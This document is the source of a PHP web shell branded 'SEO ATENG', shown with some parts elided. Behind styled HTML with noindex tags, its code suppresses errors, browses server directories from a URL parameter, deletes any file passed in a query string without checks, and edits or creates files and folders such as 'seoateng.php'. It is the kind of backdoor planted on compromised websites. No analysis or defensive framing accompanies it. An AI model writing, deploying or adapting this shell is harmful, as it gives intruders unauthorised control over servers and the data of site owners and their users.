<html>
<head>
<title>SEO-ATENG</title>
<meta name="robots" content="noindex,nofollow">
<meta name="googlebot" content="noindex">
<meta name="description" content="Seo Bandel">
<style>
	body {
...
table, th {
    border: 3px solid #fbff14ff;
    box-sizing: border-box;
    padding: 8px 2px;
    color: #00BFFF;
    text-shadow: 1px 1px 1px #fbff14ff;
}
...
table td a {
    text-decoration: none;
    color: #00BFFF;
    text-shadow: 1px 1px 1px #fffb14ff;
}
...
input {
  ...
  font-size: 15px;
  color: #00BFFF;
  border: 2px solid #fbff14ff;
  text-shadow: 5px 5px 30px #fbff14ff;
  box-sizing: border-box;
  width: 100%;
  padding: 10px;
  margin-bottom: 10px;
...
.button1 {
  ...
  background-color: black;
  border-radius: 5px;
  border: 3px solid #ffe714ff;
  box-shadow: .5px .5px .3px .3px #e7ff14ff;
  box-sizing: border-box;
  text-align: center;
  text-decoration: none;
}
...
.button1:hover {
  ...
  box-shadow: .5px .5px .3px .3px #fffb14ff;
}
textarea {
		border: 3px solid #ffef14ff;
		border-radius: 5px;
		box-shadow: 1px 1px 1px 1px #fffb14ff;
		width: 98%;
		height: 400px;
		padding-left: 10px;
		margin: 10px auto;
...
<br>
<div class="dir">
<b>- <font face="Kelly Slab" color="white" size="10">🐵 SEO ATENG 🐵</font> -</b>
<br>
<?php
error_reporting(0);
ob_start();
...
@ini_set('magic_quotes_runtime', 0);
	if (isset($_GET['dir'])) {
		...
		foreach ($dirs as $key => $value) {
			if ($value == "" && $key == 0){
				echo '<i class="fa fa-folder-o"></i> : <a href="/"><font color="#fffb14ff">/</a>'; continue;
			} echo '<a href="?dir=';
...
if (isset($_GET['delete'])) {
	if (unlink($_GET['delete'])) {
		echo
"<script>alert('Sudah Dihapus Bre');window.location='?dir=".$dir."';</script>";
	}
}
if (isset($_GET['ubah'])) {
echo "<span><font color='#ffef14ff'>Open File :</font>
...
Create File :
<input type='text' name='s' value='seoateng.php'>
...
<input type='text' name='okfolder' value='SEOATENG_FOLDER'><br>
...
<br>
<footer>© 2025 SEO ATENG. <a href='?die'>Log Out</a>
</footer>
<hr color='#ffe714ff' width='60%'>
</body>
</html>
